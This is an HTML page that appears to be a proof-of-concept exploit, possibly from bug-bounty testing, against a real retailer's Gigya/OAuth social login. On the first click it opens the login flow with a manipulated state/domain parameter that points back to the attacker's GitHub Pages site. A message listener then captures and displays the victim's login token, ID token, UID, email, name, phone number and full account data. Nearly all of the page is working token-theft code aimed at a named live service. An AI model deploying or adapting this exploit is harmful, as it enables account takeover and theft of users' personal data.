<!DOCTYPE html>
<!-- saved from url=(0014)about:internet -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title>Test Site for saurabh oauth flow</title>
<style>
body {
    font-family: Arial;
    padding: 30px;
}

.card {
    border: 1px solid #ddd;
    padding: 15px;
    margin-bottom: 20px;
}

pre {
    background: #f4f4f4;
    padding: 15px;
    overflow: auto;
    white-space: pre-wrap;
}
</style>
</head>
<body>

<h2>Click anywhere to begin</h2>

<div id="output"></div>

<script>

document.addEventListener("click", () => {

    window.open(
        "https://ssosocial.caseys.com/accounts.socialLogin?x_provider=googleplus&x_lang=default&x_regSource=https%3A%2F%2Fwww.caseys.com%2Flogin&x_sessionExpiration=3600&x_enabledProviders=googleplus%2Capple&x_finalizeRegistration=true&x_include=profile%2Cdata%2Cemails%2Csubscriptions%2Cpreferences%2C&x_includeUserInfo=true&x_loginMode=standard&x_apiDomain=us1.gigya.com&x_conflictHandling=fail&x_source=showScreenSet&x_sdk=js_next&client_id=3_OFr4vtg_Bd96kSUSzSVoxDzFeJ1P64fc157RHIoiHIGKP3YyGUf8Kaak-3GkvqTH&redirect_uri=%2FGS%2FAfterLogin.aspx&response_type=server_token&state=domain%3Dhttps://saurabhg%2ddeloitte.github.io%2fsg%2dtesting%2f%23https%253A%252F%252Fwww.caseys.com%252Flogin%26lid%3Dflid1781447387121%26messaging%3D1%26id%3Daccounts_socialLogin_17814474012631781447401263%26sourceURL%3Dhttps%253A%252F%252Fwww.caseys.com%252Flogin%253FisGuestCheckout%253Dfalse%2526gig_events%253Dsocialize.login%25252Caccounts.login&authMode=cookie",
        "_blank"
    );

}, { once: true });

window.addEventListener("message", function(e) {

    console.log("Received message:", e.data);

    try {

        const firstEqual = e.data.indexOf("=");
        if (firstEqual === -1) return;

        const value = e.data.substring(firstEqual + 1);
        const decoded = decodeURIComponent(value);
        const params = new URLSearchParams(decoded);

        let accountInfo = {};

        if (params.has("accountInfo")) {
            try {
                accountInfo = JSON.parse(
                    decodeURIComponent(params.get("accountInfo"))
                );
            } catch {}
        }

        const profile = accountInfo.profile || {};
        const userInfo = accountInfo.userInfo || {};
        const data = accountInfo.data || {};

        const info = {
            login_token: params.get("login_token"),
            id_token: params.get("id_token"),
            expires_in: params.get("expires_in"),

            uid: accountInfo.UID || userInfo.UID,
            email: profile.email || userInfo.email,
            first_name: profile.firstName || userInfo.firstName,
            last_name: profile.lastName || userInfo.lastName,
            phone: data.phoneNumber,

            login_provider:
                accountInfo.loginProvider || userInfo.loginProvider,

            registered: accountInfo.registered,
            created: accountInfo.created,
            last_login: accountInfo.lastLogin,

            verified: accountInfo.isVerified,
            registered_user: accountInfo.isRegistered,

            photo: profile.photoURL
        };

        let html = '<div class="card"><h3>Extracted Information</h3>';

        for (const [k, v] of Object.entries(info)) {
            html += `
                <p>
                    <b>${k}</b><br>
                    ${v ?? ""}
                </p>
            `;
        }

        html += "</div>";

        html += `
            <div class="card">
                <h3>Raw Message</h3>
                <pre>${e.data}</pre>
            </div>
        `;

        html += `
            <div class="card">
                <h3>Full accountInfo JSON</h3>
                <pre>${JSON.stringify(accountInfo, null, 2)}</pre>
            </div>
        `;

        document.getElementById("output").innerHTML = html;

    } catch (err) {
        // silently ignore parsing errors
        console.error(err);
    }

});

</script>


</body></html>
